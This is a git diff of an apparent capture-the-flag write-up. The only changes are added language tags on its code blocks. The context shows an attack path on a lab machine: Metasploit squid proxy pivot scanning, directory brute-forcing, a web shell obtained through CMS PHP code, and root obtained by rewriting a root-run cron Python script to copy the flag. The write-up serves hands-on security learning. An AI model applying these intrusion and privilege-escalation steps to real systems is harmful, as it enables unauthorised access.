@@ -18,7 +18,7 @@ PORT     STATE  SERVICE    VERSION
 ```
 Seems port 3128 has a squid proxy open. This might allow for proxy pivoting to scan the internal network
 
-```
+```bash
 msfconsole
 use auxiliary/scanner/http/squid_pivot_scanning
 set RHOSTS <IP>
@@ -29,7 +29,7 @@ run
 
 this does an internal port scan and returns
 
-```
+```bash
 [+] [IP] IP is alive but 21 is CLOSED
 [+] [IP] IP:80 seems OPEN
 [+] [IP] IP is alive but 139 is CLOSED
@@ -57,7 +57,7 @@ dirb <ip>
 
 this returns:
 
-```
+```bash
 ---- Scanning URL: http://<IP>/ ----
 + http://<IP>/cgi-bin/ (CODE:403|SIZE:290)                                     
 + http://<IP>/connect (CODE:200|SIZE:109)                                      
@@ -70,7 +70,7 @@ this returns:
 
 Let's look in robots.txt to see if there are any directories we've missed
 
-```
+```bash
 User-agent: *
 Disallow: /
 Dissalow: /wolfcms
@@ -89,21 +89,21 @@ by going to the article list we can see an article that contains php code. This 
 
 now that we have our shell we can do some recon on the machine.
 
-```
+```bash
 whoami
 www-data
 ```
 
 If we check /etc/cron.d/automate we can see that it contains
 
-```
+```bash
 * * * * * root /usr/bin/python /var/www/connect.py
 ```
 
 This means it executes a file as root in /var/www. since we are www-data we are able to write in that directory. This means we can edit the connect.py file to execute any piece of code we want.
 This way we can read the flag by writing the python code
 
-```
+```python
 f = open("/root/a0216ea4d51874464078c618298b1367.txt")
 f2 = open("/var/www/flag.txt", 'w')
 f2.write(f.read())
@@ -111,7 +111,7 @@ f2.write(f.read())
 
 After a little wait it creates a flag.txt file that we can read with the contents:
 
-```
+```bash
 If you are viewing this!!
 
 ROOT!
